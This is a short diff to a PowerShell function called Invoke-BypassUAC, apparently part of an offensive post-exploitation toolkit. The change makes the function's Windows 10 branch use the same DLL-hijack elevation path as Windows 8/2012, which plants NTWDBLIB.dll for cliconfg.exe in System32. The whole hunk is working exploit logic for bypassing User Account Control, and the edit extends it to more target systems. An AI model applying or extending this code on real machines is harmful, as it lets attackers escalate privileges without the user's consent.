@@ -552,15 +552,15 @@ function Invoke-BypassUAC
         $szTempDllPath = $TempPayloadPath
         Write-Verbose "Windows 7/2008 detected"
     }
-    elseif (($OSVersion -eq "6.2") -or ($OSVersion -eq "6.3")) {
-        # windows 8/2012
+    elseif (($OSVersion -eq "6.2") -or ($OSVersion -eq "6.3") -or ($OSVersion -eq "10.0")) {
+        # windows 8/10/2012
         $szElevDll = 'NTWDBLIB.dll'
         $szElevDir = $env:WINDIR + "\System32"
         $szElevDirSysWow64 = ''
         $szElevExeFull = "$szElevDir\cliconfg.exe"
         $szElevDllFull = "$szElevDir\$szElevDll"
         $szTempDllPath = $TempPayloadPath
-        Write-Verbose "Windows 8/2012 detected"
+        Write-Verbose "Windows 8/10/2012 detected"
     }
     else {
         "[!] Unsupported OS!"
